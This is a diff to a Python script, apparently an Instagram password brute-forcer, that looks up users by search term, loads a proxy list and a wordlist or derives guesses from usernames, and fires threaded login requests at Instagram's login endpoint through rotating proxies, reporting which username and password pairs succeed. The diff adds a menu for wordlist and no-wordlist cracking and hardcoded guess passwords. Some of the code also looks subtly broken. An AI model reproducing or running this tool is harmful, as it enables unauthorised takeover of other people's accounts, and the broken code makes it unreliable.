@@ -31,26 +31,6 @@ def prx():
              os.system('python igbf.py')
     except requests.exceptions.ConnectionError:
              sys.exit('\033[91mConnection Error!\033[00m')
-clear()
-baner()
-try:
-     fl=input('\033[00mProxy(\033[93mlist.txt\033[00m): \033[93m')
-     rr=open(fl,'r').read()
-except FileNotFoundError:
-       print('\033[00m[\033[91m!\033[00m]Proxy Not Found')
-       print('\033[00mPlease Waiting...')
-       time.sleep(3)
-       print('\033[00mSearch Proxy')
-       time.sleep(1)
-       prx()
-except requests.exceptions.ConnectionError:
-       sys.exit('\033[91mConnection Error!\033[00m')
-fi=rr.strip().split('\n')
-b=fi[0]
-rd=random.choice(b)
-pro={
-"http":f"http://{rd}",
-"hrtps":f"https://{rd}"}
 try:
     user_agent = requests.get('https://pastebin.com/raw/zkCXTGcm').text.split('\n')
     acak=random.choice(user_agent)
@@ -64,23 +44,38 @@ ua={
 'user-agent': '{acak}',
 'x-csrftoken': csrftoken,
 'x-requested-with': 'XMLHttpRequest'}
-try:
-     f=input('\n\033[00mSearch User: \033[96m')
-     dat= requests.get("https://www.instagram.com/web/search/topsearch/?query="+f).text
-except requests.exceptions.ConnectionError:
-       sys.exit('\033[91mConnection Error!\033[00m')
 js= json.loads(dat)
 vuln=[]
 result=0
-try:
-     zz=input('\033[00mWordList(\033[93mList.txt\033[00m):\033[93m')
-     pwd=open(zz,'r').read()
-except FileNotFoundError:
-       print('\033[91mWordlist Not Found!\033[00m')
-       time.sleep(2)
-       os.system("python igbf.py")
-pwd1=pwd.strip().split('\n')
 def pkwd():
+       try:
+           fl=input('\033[00mProxy(\033[93mlist.txt\033[00m): \033[93m')
+           rr=open(fl,'r').read()
+       except FileNotFoundError:
+           print('\033[00m[\033[91m!\033[00m]Proxy Not Found')
+           print('\033[00mPlease Waiting...')
+           time.sleep(3)
+           print('\033[00mSearch Proxy')
+           time.sleep(1)
+           prx()
+       fi=rr.strip().split('\n')
+       b=fi[0]
+       rd=random.choice(b)
+       pro={
+       "http":f"http://{rd}",
+       "hrtps":f"https://{rd}"}
+       try:
+           f=input('\n\033[00mSearch User: \033[96m')
+           dat= requests.get("https://www.instagram.com/web/search/topsearch/?query="+f).text
+           zz=input('\033[00mWordList(\033[93mList.txt\033[00m):\033[93m')
+           pwd=open(zz,'r').read()
+       except FileNotFoundError:
+           print('\033[91mWordlist Not Found!\033[00m')
+           time.sleep(2)
+           os.system("python igbf.py")
+       except requests.exceptions.ConnectionError:
+           sys.exit('\033[91mConnection Error\033[00m')
+       pwd1=pwd.strip().split('\n')
        with ThreadPoolExecutor(max_workers=10) as ex:
             ex.submit(True)
             for x in js['users']:
@@ -117,13 +112,32 @@ def pkwd():
                                             break
                                   else:
                                        print("\033[00m[\033[91mx\033[00m]"+us+ '|' +passw)
-                               except KeyError:
-                                      pkwd()
-pkwd()
+                              except KeyError:
+                                     pkwd()
                             
-def gpkwd():      
-    time.sleep(10)    
-     with ThreadPoolExecutor(max_workers=10) as ex:
+def gpkwd():  
+    try:
+          fl=input('\033[00mProxy(\033[93mlist.txt\033[00m): \033[93m')
+          rr=open(fl,'r').read()
+    except FileNotFoundError:
+          print('\033[00m[\033[91m!\033[00m]Proxy Not Found')
+          print('\033[00mPlease Waiting...')
+          time.sleep(3)
+          print('\033[00mSearch Proxy')
+          time.sleep(1)
+          prx()
+    fi=rr.strip().split('\n')
+    b=fi[0]
+    rd=random.choice(b)
+    pro={
+    "http":f"http://{rd}",
+    "hrtps":f"https://{rd}"}    
+    try:
+           f=input('\n\033[00mSearch User: \033[96m')
+           dat= requests.get("https://www.instagram.com/web/search/topsearch/?query="+f).text
+    except requests.exceptions.ConnectionError:
+           sys.exit('\033[91mConnection Error\033[00m')  
+    with ThreadPoolExecutor(max_workers=10) as ex:
            ex.submit(True)
            for x in js['users']:
                us= x['user']['username']
@@ -135,7 +149,7 @@ def gpkwd():
                          str(x) + "123",
                          str(x) + "12345",
                    ]
-                   litpas.append(x)
+                   litpas.append('Sayang123' + '\n' + 'Bangsat123')
                    for passw in set(litpas):
                        time.sleep(2)
                        reg = requests.post('https://www.instagram.com/accounts/login/ajax/', headers=ua, data={'username': us,'enc_password':f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{passw}','queryParams': '{}'}, proxies=pro, timeout=10)
@@ -155,9 +169,26 @@ def gpkwd():
                                                          
                            else:
                                    print('\033[00m[\033[91mx\033[00m]'+us+ '|' +passw)
-                        except KeyError:
-                                   print('\033[91mError!\033[00m')
-                                   time.sleep(10)
-                                   gpkwd()
-                        except requests.exceptions.ConnectionError:
+                       except KeyError:
+                               print('\033[91mError!\033[00m')
+                               time.sleep(10)
+                               gpkwd()
+                       except requests.exceptions.ConnectionError:
                                sys.exit('\033[91mConnection Error\033[00m')
+if __name__=="__main__":
+     while True:
+          clear()
+          baner()
+          bc=input('\033[096m1).\033[00mCrack Wordlist\n\033[96m2).Crack Not Wordlist\n\033[00m>> \033[96m')
+          if bc == '1':
+             clear()
+             baner()
+             pkwd()
+          elif bc == '2':
+             clear()
+             baner()
+             gpkwd()
+          else:
+             print('\033[91mWrong Input!\033[00m')
+     
+     
